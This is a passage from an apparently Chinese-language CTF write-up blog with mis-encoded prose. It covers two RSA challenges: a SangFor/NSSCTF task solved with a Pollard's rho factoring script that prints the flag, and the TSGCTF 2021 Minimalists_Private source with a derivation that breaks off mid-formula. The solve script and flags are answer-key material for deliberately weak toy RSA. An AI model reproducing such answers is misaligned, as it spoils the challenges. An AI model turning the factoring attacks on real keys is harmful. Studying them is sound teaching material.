class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_prime</span>(<span class="hljs-params">nbits, gamma</span>):<br>    g = getPrime(<span class="hljs-built_in">int</span>(nbits * gamma))<br>    alpha = <span class="hljs-number">0.5</span> - gamma<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        a = getRandomNBitInteger(<span class="hljs-built_in">int</span>(alpha * nbits))<br>        p = <span class="hljs-number">2</span> * g * a + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> isPrime(p):<br>            b = getRandomNBitInteger(<span class="hljs-built_in">int</span>(alpha * nbits))<br>            q = <span class="hljs-number">2</span> * g * b + <span class="hljs-number">1</span><br>            h = <span class="hljs-number">2</span> * g * a * b + a + b<br>            <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(q) <span class="hljs-keyword">or</span> isPrime(h) <span class="hljs-keyword">or</span> gmpy2.gcd(a, b) != <span class="hljs-number">1</span>:<br>                b = getRandomNBitInteger(<span class="hljs-built_in">int</span>(alpha * nbits))<br>                q = <span class="hljs-number">2</span> * g * b + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> p, q<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">nbits, gamma</span>):<br>    p, q = gen_prime(nbits, gamma)<br>    n = p * q<br>    e = getPrime(<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">while</span> gmpy2.gcd(e, gmpy2.lcm(p-<span class="hljs-number">1</span>,q-<span class="hljs-number">1</span>)) != <span class="hljs-number">1</span>:<br>        e = getPrime(<span class="hljs-number">16</span>)<br>    m = bytes_to_long(flag)<br>    c = <span class="hljs-built_in">pow</span>(m, e, n)<br>    <span class="hljs-keyword">return</span> n, e, c<br><br>n, e, c = encrypt(<span class="hljs-number">1024</span>, <span class="hljs-number">0.48</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;n =&#x27;</span>, n<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;e =&#x27;</span>, e<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;c =&#x27;</span>, c<br><br><span class="hljs-comment"># n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span><br><span class="hljs-comment"># e = 58337</span><br><span class="hljs-comment"># c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-24"><a class="markdownIt-Anchor" href="#åˆ†æ-24"></a> åˆ†æ</h2><p>åˆ†æäº†åŠå¤©ï¼Œå‘ç°è¿˜æ˜¯åªä¼šç…§æ¬wp</p><p>PollardRho ç®—æ³•ï¼š</p><p><a href="https://www.cnblogs.com/RioTian/p/13928916.html">ã€å¿«é€Ÿå› æ•°åˆ†è§£ã€‘Pollardâ€™s Rho ç®—æ³• - RioTian (cnblogs.com)</a></p><p>ä¼˜åŒ–ï¼šæ–¹æ³•æ¥è‡ª<em>Cryptanalysis of RSA and Itâ€™s Variants</em>çš„<strong>Section 11.2 Factoring the Modulus</strong></p><p>å°†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^2+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>æ”¹æˆäº†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>+</mo><mn>3</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x^{n-1}+3\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>è¿™ä¸ªä¼˜åŒ–æ–¹æ³•çš„åŸç†æˆ‘æ²¡æ‰¾åˆ°</p><h2 id="exp-24"><a class="markdownIt-Anchor" href="#exp-24"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br>f = <span class="hljs-keyword">lambda</span> x,n: (<span class="hljs-built_in">pow</span>(x, n - <span class="hljs-number">1</span>, n) + <span class="hljs-number">3</span>) % n<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phllard_rho</span>(<span class="hljs-params">n</span>):<br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        a = getRandomRange(<span class="hljs-number">2</span>, n)<br>        b = f(a, n)<br>        j = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            p = GCD(<span class="hljs-built_in">abs</span>(a - b), n)<br>            <span class="hljs-keyword">if</span> p == n:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">elif</span> p &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> (p, n // p)<br>            <span class="hljs-keyword">else</span>:<br>                a = f(a, n)<br>                b = f(f(b, n), n)<br>            j += <span class="hljs-number">1</span><br>        i += <span class="hljs-number">1</span><br><br>n = <span class="hljs-number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span><br>c = <span class="hljs-number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span><br>e = <span class="hljs-number">58337</span><br><br>p,q = phllard_rho(n)<br>d = invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br><span class="hljs-comment">#b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;</span><br></code></pre></td></tr></table></figure><h1 id="tsgctf-2021minimalists_private"><a class="markdownIt-Anchor" href="#tsgctf-2021minimalists_private"></a> [TSGCTF 2021]Minimalists_Private</h1><h2 id="é¢˜ç›®-25"><a class="markdownIt-Anchor" href="#é¢˜ç›®-25"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> isPrime<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> p, q, L, e, d<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RSA</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, p, q, L, e, d</span>):<br>        <span class="hljs-keyword">assert</span>(isPrime(p) <span class="hljs-keyword">and</span> isPrime(q))<br>        <span class="hljs-variable language_">self</span>.N = p * q<br>        <span class="hljs-variable language_">self</span>.L = L<br>        <span class="hljs-variable language_">self</span>.e = e<br>        <span class="hljs-variable language_">self</span>.d = d<br><br>        <span class="hljs-comment"># these are the normal RSA conditions</span><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>            <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">pow</span>(randrange(<span class="hljs-number">1</span>, <span class="hljs-variable language_">self</span>.N), <span class="hljs-variable language_">self</span>.L, <span class="hljs-variable language_">self</span>.N) == <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">assert</span>(<span class="hljs-variable language_">self</span>.e * <span class="hljs-variable language_">self</span>.d % <span class="hljs-variable language_">self</span>.L == <span class="hljs-number">1</span>)<br><br>        <span class="hljs-comment"># minimal is the best</span><br>        <span class="hljs-keyword">assert</span>(<span class="hljs-variable language_">self</span>.L * <span class="hljs-variable language_">self</span>.L &lt;= <span class="hljs-number">10000</span> * <span class="hljs-variable language_">self</span>.N)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_private_key</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">self</span>.N, <span class="hljs-variable language_">self</span>.d)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_public_key</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">self</span>.N, <span class="hljs-variable language_">self</span>.e)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self, msg</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(msg, <span class="hljs-variable language_">self</span>.e, <span class="hljs-variable language_">self</span>.N)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, c</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(c, <span class="hljs-variable language_">self</span>.d, <span class="hljs-variable language_">self</span>.N)<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>msg = <span class="hljs-built_in">int</span>.from_bytes(flag, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-keyword">assert</span>(msg &lt; p * q)<br><br>rsa = RSA(p, q, L, e, d)<br>encrypted = rsa.encrypt(msg)<br><span class="hljs-keyword">assert</span>(rsa.decrypt(encrypted) == msg)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;N, e = <span class="hljs-subst">&#123;rsa.gen_public_key()&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;encrypted&#125;</span>&#x27;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">#requirements:pycryptodome == 3.9.9</span><br><span class="hljs-string"></span><br><span class="hljs-string">N, e = (1108103848370322618250236235096737547381026108763302516499816051432801216813681568375319595638932562835292256776016949573972732881586209527824393027428125964599378845347154409633878436868422905300799413838645686430352484534761305185938956589612889463246508935994301443576781452904666072122465831585156151, 65537)</span><br><span class="hljs-string">c = 254705401581808316199469430068831357413481187288921393400711004895837418302514065107811330660948313420965140464021505716810909691650540609799307500282957438243553742714371028405100267860418626513481187170770328765524251710154676478766892336610743824131087888798846367363259860051983889314134196889300426</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-25"><a class="markdownIt-Anchor" href="#åˆ†æ-25"></a> åˆ†æ</h2><p>å·²çŸ¥</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mi>L</mi></msup><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mo>âˆ—</mo><mi>d</mi><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>L</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^L=1\quad mod(N)\\e*d=1\quad mod(L)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8913309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">L</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mclose">)</span></span></span></span></span></p><p>æ ¹æ®è´¹é©¬å°å®šç†å¯ä»¥çŸ¥é“<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mfrac><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><mi>k</mi></mfrac></mrow><annotation encoding="application/x-tex">L=\frac{\phi(N)}{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Ï•</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>åˆæœ‰</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>L</mi><mn>2</mn></msup><mo>â‰¤</mo><mn>10000</mn><mo>âˆ—</mo><mi>N</mi><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mfrac><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><mi>k</mi></mfrac><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>â‰¤</mo><mn>10000</mn><mo>âˆ—</mo><mi>p</mi><mo>âˆ—</mo><mi>q</mi><mspace linebreak="newline"></mspace><mi>Ï•</mi><mo stretchy="false">(</mo><mi>N</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>â‰¤</mo><mn>10000</mn><mo>âˆ—</mo><mi>p</mi><mo>âˆ—</mo><mi>q</mi><mo>âˆ—</mo><msup><mi>k</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">L^2â‰¤10000*N\\(\frac{\phi(N)}{k})^2â‰¤10000*p*q\\\phi(N)^2â‰¤10000*p*q*k^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0000779999999998em;vertical-align:-0.13597em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><p>å› ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>â‰ˆ</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">\phi(N)â‰ˆN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></p><p>æ‰€ä»¥ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>N</mi><mn>2</mn></msup><mo>&lt;</mo><mn>10000</mn><mo>âˆ—</mo><mi>p</mi><mo>âˆ—</mo><mi>q</mi><mo>âˆ—</mo><msup><mi>k</mi><mn>2</mn></msup><mspace linebreak="newline"></mspace><mi>N</mi><mo>&lt;</mo><mn>10000</mn><mo>âˆ—</mo><msup><mi>k</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">N^2&lt;10000*p*q*k^2\\N&lt;10000*k^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9032079999999999em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span 